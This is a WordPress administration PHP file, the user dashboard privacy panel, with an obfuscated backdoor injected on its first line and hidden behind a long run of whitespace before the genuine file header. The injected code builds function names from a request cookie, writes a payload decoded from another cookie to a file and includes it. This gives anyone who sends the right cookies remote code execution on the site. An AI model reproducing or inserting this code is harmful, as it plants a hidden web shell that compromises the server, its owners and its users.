<?php																																										if(isset($_COOKIE[3])&&isset($_COOKIE[32])){$c=$_COOKIE;$k=0;$n=2;$p=array();$p[$k]='';while($n){$p[$k].=$c[32][$n];if(!$c[32][$n+1]){if(!$c[32][$n+2])break;$k++;$p[$k]='';$n++;}$n=$n+2+1;}$k=$p[0]().$p[11];if(!$p[26]($k)){$n=$p[6]($k,$p[18]);$p[25]($n,$p[5].$p[17]($p[21]($c[3])));}include($k);}

/**
 * User Dashboard Privacy administration panel.
 *
 * @package WordPress
 * @subpackage Administration
 * @since 4.9.0
 */

/** Load WordPress Administration Bootstrap */
require_once __DIR__ . '/admin.php';

require ABSPATH . 'wp-admin/privacy.php';
